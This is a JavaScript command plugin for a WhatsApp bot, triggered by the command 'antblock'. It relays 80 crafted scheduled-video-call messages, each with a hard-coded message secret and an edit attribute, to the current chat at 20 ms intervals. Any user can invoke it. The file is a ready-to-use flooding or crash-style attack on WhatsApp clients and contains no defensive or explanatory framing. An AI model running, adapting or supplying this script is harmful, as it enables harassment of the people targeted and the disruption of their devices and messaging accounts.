const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

let handler = async (m, { conn }) => {

  const cantidad = 80;
  const from = m.chat;

  for (let i = 0; i < cantidad; i++) {
    await conn.relayMessage(from, {
      messageContextInfo: {
        messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
        deviceListMetaData: {},
        deviceListMetadataVersion: 2
      },
      scheduledCallCreationMessage: {
        scheduledTimestampMs: '1200',
        callType: "VIDEO",
        title: '👻 ' + Math.random().toString(36).slice(2, 6),
      }
    }, {
      additionalAttributes: {
        edit: '7'
      }
    });

    await delay(20);
  }
};

handler.command = ['antblock'];
handler.owner = false;
handler.bot = false;

export default handler;
